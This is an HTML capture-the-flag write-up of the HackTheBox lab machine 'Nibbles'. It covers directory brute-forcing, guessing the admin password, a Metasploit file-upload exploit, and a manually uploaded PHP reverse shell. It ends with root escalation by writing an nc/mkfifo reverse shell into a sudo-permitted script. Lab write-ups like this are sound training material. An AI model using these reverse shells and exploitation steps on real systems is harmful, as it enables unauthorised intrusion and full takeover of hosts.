@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Nibbles</strong></h1>
+        <em>Released: 13th January 2018 / Pwned: 18th September 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Nibbles invovles brute-forcing for directories on a web server to find an admin page. You find a valid username within the site's config settings, but have to guess the password. Once in, you can upload a php shell to gain access to the system. To priv-esc to root, you exploit sudo privileges on a file which you have write access to, and modify the file so that it sends a roto shell back to you.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -T4 -sV -sC -O -oN nmap/tcp-top1000.txt 10.10.10.75</code><br>
+        <br>
+        -T4 aggressive scan<br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/nibbles#&nbsp;nmap&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-top1000.txt&nbsp;10.10.10.75<br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.2&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9&nbsp;(ED25519)<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;((Ubuntu))<br>
+                |_http-server-header:&nbsp;Apache/2.4.18&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html).<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Analysis of results:<br>
+        • 22/ssh - Nothing can be done with ssh for the time being.<br>
+        • 80/http - A website - always a good place to start<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        <code>http://10.10.10.75/</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Right click &gt; view-source and you'll find a reference to a directory - <code>/nibbleblog/</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>2a) Nibbleblog</strong></h2><br>
+        <code>http://10.10.10.75/nibbleblog/</code><br>
+        Nibbleblog looks like a blog framework.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>2b) Gobuster - Find username</strong></h3><br>
+        Clicking around, you'll find references to <code>.php</code> files, so run gobuster against <code>/nibbleblog</code> brute-forcing for <code>.php</code> extensions.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/nibbles/80#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.75/nibbleblog/&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt&nbsp;-x&nbsp;.php<br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.75/nibbleblog/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Extensions&nbsp;&nbsp;&nbsp;:&nbsp;php<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/09/18&nbsp;10:49:37&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.75/nibbleblog/.htpasswd&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.75/nibbleblog/.htpasswd.php&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.75/nibbleblog/.htaccess&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.75/nibbleblog/.htaccess.php&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.75/nibbleblog/README&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.75/nibbleblog/admin&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.75/nibbleblog/admin.php&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.75/nibbleblog/content&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.75/nibbleblog/feed.php&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.75/nibbleblog/index.php&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.75/nibbleblog/install.php&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.75/nibbleblog/languages&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.75/nibbleblog/plugins&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.75/nibbleblog/sitemap.php&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.75/nibbleblog/themes&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.75/nibbleblog/update.php&nbsp;(Status:&nbsp;200)<br>
+                =====================================================<br>
+                2019/09/18&nbsp;10:51:51&nbsp;Finished<br>
+                =====================================================
+            </div>
+        </div><br>
+        <br>
+        <code>/README</code> identifies the nibbleblog version - 4.03.<br>
+        <code>/admin.php</code> is an admin login page.<br>
+        <code>/admin</code>, <code>/content</code>, <code>/languages</code>, <code>/plugins</code>, <code>/themes</code> are all directory listings, which you can browse.<br>
+        <br>
+        Inside <code>/content/private/users.xml</code>, you'll find a username - <code>admin</code>.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2c) Admin Panel</strong></h3><br>
+        I couldn't find any reference to a password throughout any of the directory listings, which felt unfair.<br>
+        However, the title of the box is often a clue in itself.<br>
+        <br>
+        Log in at the admin page with credentials <code>admin / nibbles</code>.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        We've logged into an admin panel.<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>3) Upload php shell</strong></h2><br>
+        If you searchsploit nibbleblog, you'll discover that Nibbleblog version 4.03's My image plugin is vulnerable to a file upload vulnerability.<br>
+        You can use the metasploit module or do it manually, both are pretty trivial.<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3a) Metasploit module</strong></h3><br>
+            <div class="codebox">
+                root@gotham:~/ctf/nibbles#&nbsp;msfconsole&nbsp;-q<br>
+                [...]<br>
+                msf5&nbsp;&gt;&nbsp;use&nbsp;exploit/multi/http/nibbleblog_file_upload<br>
+                msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;set&nbsp;PASSWORD&nbsp;nibbles<br>
+                msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;set&nbsp;RHOSTS&nbsp;10.10.10.75<br>
+                msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;set&nbsp;TARGETURI&nbsp;/nibbleblog/<br>
+                msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;set&nbsp;USERNAME&nbsp;admin<br>
+                msf5&nbsp;exploit(multi/http/nibbleblog_file_upload)&nbsp;&gt;&nbsp;exploit<br>
+                [*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.6:4444&nbsp;<br>
+                [*]&nbsp;Sending&nbsp;stage&nbsp;(38247&nbsp;bytes)&nbsp;to&nbsp;10.10.10.75<br>
+                [*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(10.10.14.6:4444&nbsp;-&gt;&nbsp;10.10.10.75:56256)&nbsp;at&nbsp;2019-09-17&nbsp;18:18:19&nbsp;+0100<br>
+                [+]&nbsp;Deleted&nbsp;image.php<br>
+                <br>
+                meterpreter&nbsp;&gt;&nbsp;sysinfo<br>
+                Computer&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Nibbles<br>
+                OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Linux&nbsp;Nibbles&nbsp;4.4.0-104-generic&nbsp;#127-Ubuntu&nbsp;SMP&nbsp;Mon&nbsp;Dec&nbsp;11&nbsp;12:16:42&nbsp;UTC&nbsp;2017&nbsp;x86_64<br>
+                Meterpreter&nbsp;:&nbsp;php/linux
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>3b) Manually upload shell</strong></h3><br>
+        First, prep the shell you're going to upload.<br>
+        I'm using pentest-monkey's php reverse shell.<br>
+        Edit the <code>$ip</code> and <code>$port</code> variables to that of your attacking machine.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/nibbles#&nbsp;cp&nbsp;/usr/share/webshells/php/php-reverse-shell.php&nbsp;.<br>
+                root@gotham:~/ctf/nibbles#&nbsp;mv&nbsp;php-reverse-shell.php&nbsp;monkey.php<br>
+                root@gotham:~/ctf/nibbles#&nbsp;nano&nbsp;monkey.php<br>
+                [...]<br>
+                //<br>
+                //&nbsp;Usage<br>
+                //&nbsp;-----<br>
+                //&nbsp;See&nbsp;http://pentestmonkey.net/tools/php-reverse-shell&nbsp;if&nbsp;you&nbsp;get&nbsp;stuck.<br>
+                <br>
+                set_time_limit&nbsp;(0);<br>
+                $VERSION&nbsp;=&nbsp;"1.0";<br>
+                $ip&nbsp;=&nbsp;'10.10.14.15';&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS<br>
+                $port&nbsp;=&nbsp;9001;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;CHANGE&nbsp;THIS
+            </div>
+        </div><br>
+        <br>
+        And start a listener on your attacking machine to receive the shell.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/nibbles#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Next, upload the shell.<br>
+        On the admin panel, go to Plugins &gt; My image &gt; Configure<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        You're at a file upload form.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        Browse to the reverse shell you prepped and upload it.<br>
+        Ignore the errors, they don't matter.<br>
+        <br>
+        To activate the shell, visit:<br>
+        <code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php</code><br>
+        <br>
+        The page should load and you should have a shell on your listener!<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.15]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.75]&nbsp;43102<br>
+                Linux&nbsp;Nibbles&nbsp;4.4.0-104-generic&nbsp;#127-Ubuntu&nbsp;SMP&nbsp;Mon&nbsp;Dec&nbsp;11&nbsp;12:16:42&nbsp;UTC&nbsp;2017&nbsp;x86_64&nbsp;x86_64&nbsp;x86_64&nbsp;GNU/Linux<br>
+                &nbsp;05:57:55&nbsp;up&nbsp;40&nbsp;min,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average:&nbsp;0.00,&nbsp;0.00,&nbsp;0.00<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br>
+                uid=1001(nibbler)&nbsp;gid=1001(nibbler)&nbsp;groups=1001(nibbler)<br>
+                /bin/sh:&nbsp;0:&nbsp;can't&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                $&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Go grab user.txt.<br>
+            <div class="codebox">
+                $&nbsp;cd&nbsp;/home/nibbler<br>
+                $&nbsp;cat&nbsp;user.txt<br>
+                b02ff32bb332deba49eeaed21152c8d8
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>4) sudo -l</strong></h2><br>
+        Run <code>sudo -l</code>, and you'll discover that you can run a <code>monitor.sh</code> script present in <code>/home/nibbler/personal/stuff/monitor.sh</code>.<br>
+            <div class="codebox">
+                $&nbsp;sudo&nbsp;-l<br>
+                sudo:&nbsp;unable&nbsp;to&nbsp;resolve&nbsp;host&nbsp;Nibbles:&nbsp;Connection&nbsp;timed&nbsp;out<br>
+                Matching&nbsp;Defaults&nbsp;entries&nbsp;for&nbsp;nibbler&nbsp;on&nbsp;Nibbles:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;env_reset,&nbsp;mail_badpass,&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br>
+                <br>
+                User&nbsp;nibbler&nbsp;may&nbsp;run&nbsp;the&nbsp;following&nbsp;commands&nbsp;on&nbsp;Nibbles:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(root)&nbsp;NOPASSWD:&nbsp;/home/nibbler/personal/stuff/monitor.sh
+            </div>
+        </div><br>
+        <br>
+        Unzip the <code>personal.zip</code> in <code>/home/nibbler</code> to extract <code>monitor.sh</code>.<br>
+            <div class="codebox">
+                $&nbsp;unzip&nbsp;personal.zip<br>
+                Archive:&nbsp;&nbsp;personal.zip<br>
+                &nbsp;&nbsp;&nbsp;creating:&nbsp;personal/<br>
+                &nbsp;&nbsp;&nbsp;creating:&nbsp;personal/stuff/<br>
+                &nbsp;&nbsp;inflating:&nbsp;personal/stuff/monitor.sh
+            </div>
+        </div><br>
+        <br>
+        <code>monitor.sh</code> is just a generic script that gathers info about the system.<br>
+            <div class="codebox">
+                $&nbsp;cd&nbsp;personal/stuff/&nbsp;<br>
+                $&nbsp;cat&nbsp;monitor.sh<br>
+                [...]<br>
+                #&nbsp;Check&nbsp;Architecture<br>
+                architecture=$(uname&nbsp;-m)<br>
+                echo&nbsp;-e&nbsp;'\E[32m'"Architecture&nbsp;:"&nbsp;$tecreset&nbsp;$architecture<br>
+                <br>
+                #&nbsp;Check&nbsp;Kernel&nbsp;Release<br>
+                kernelrelease=$(uname&nbsp;-r)<br>
+                echo&nbsp;-e&nbsp;'\E[32m'"Kernel&nbsp;Release&nbsp;:"&nbsp;$tecreset&nbsp;$kernelrelease<br>
+                <br>
+                #&nbsp;Check&nbsp;hostname<br>
+                echo&nbsp;-e&nbsp;'\E[32m'"Hostname&nbsp;:"&nbsp;$tecreset&nbsp;$HOSTNAME<br>
+                <br>
+                #&nbsp;Check&nbsp;Internal&nbsp;IP<br>
+                internalip=$(hostname&nbsp;-I)<br>
+                echo&nbsp;-e&nbsp;'\E[32m'"Internal&nbsp;IP&nbsp;:"&nbsp;$tecreset&nbsp;$internalip<br>
+                <br>
+                #&nbsp;Check&nbsp;External&nbsp;IP<br>
+                externalip=$(curl&nbsp;-s&nbsp;ipecho.net/plain;echo)<br>
+                echo&nbsp;-e&nbsp;'\E[32m'"External&nbsp;IP&nbsp;:&nbsp;$tecreset&nbsp;"$externalip<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>4a) Modify monitor.sh</strong></h3><br>
+        With the script in its current state, it isn't useful to us despite being able to run it as root.<br>
+        However, <code>monitor.sh</code> is world-writable.<br>
+        Considering that we can write to the script and run it as root using sudo, we effectively have root code execution.<br>
+        <br>
+        Overwrite the exisiting <code>monitor.sh</code> and write into it whatever code you want to run as root.<br>
+        I chose to send a root reverse shell back to my attacking system.<br>
+        $ echo "mkfifo /tmp/f ; nc 10.10.14.15 9002 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt; /tmp/f ; rm /tmp/f" &gt; monitor.sh<br>
+        $ cat monitor.sh<br>
+        mkfifo /tmp/f ; nc 10.10.14.15 9002 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt; /tmp/f ; rm /tmp/f<br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>4b) Elevate to an interactive shell</strong></h3><br>
+        In order to run sudo, you need an interactive shell, otherwise you'll receive this error message:<br>
+        <code>sudo: no tty present and no askpass program specified</code><br>
+        <br>
+        Python 2 isn't installed, but Python 3 is.<br>
+        Elevate to an interactive shell using <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code><br>
+            <div class="codebox">
+                $&nbsp;which&nbsp;python<br>
+                $&nbsp;which&nbsp;python3<br>
+                /usr/bin/python3<br>
+                $&nbsp;python3&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'<br>
+                nibbler@Nibbles:/home/nibbler/personal/stuff$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>4c) Run monitor.sh</strong></h3><br>
+        Start a listener on your attacking machine to receive the shell<br>
+            <div class="codebox">
+                root@gotham:/ctf/nibbler#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Run monitor.sh as root on Nibbles with <code>sudo -u root</code>.<br>
+        You have to specify the full path of <code>monitor.sh</code> as outlined in <code>sudo -l</code> for it to the script to run as root.<br>
+            <div class="codebox">
+                nibbler@Nibbles:/home/nibbler/personal/stuff$&nbsp;sudo&nbsp;-u&nbsp;root&nbsp;/home/nibbler/personal/stuff/monitor.sh
+            </div>
+        </div><br>
+        <br>
+        Wait 10 or so seconds (becasue sudo is trying to connect to a host called Nibbler?), and you should receive a root shell on your listener :)<br>
+            <div class="codebox">
+                [..]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.15]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.75]&nbsp;46490<br>
+                id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                cat&nbsp;/root/root.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                b6d745c...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
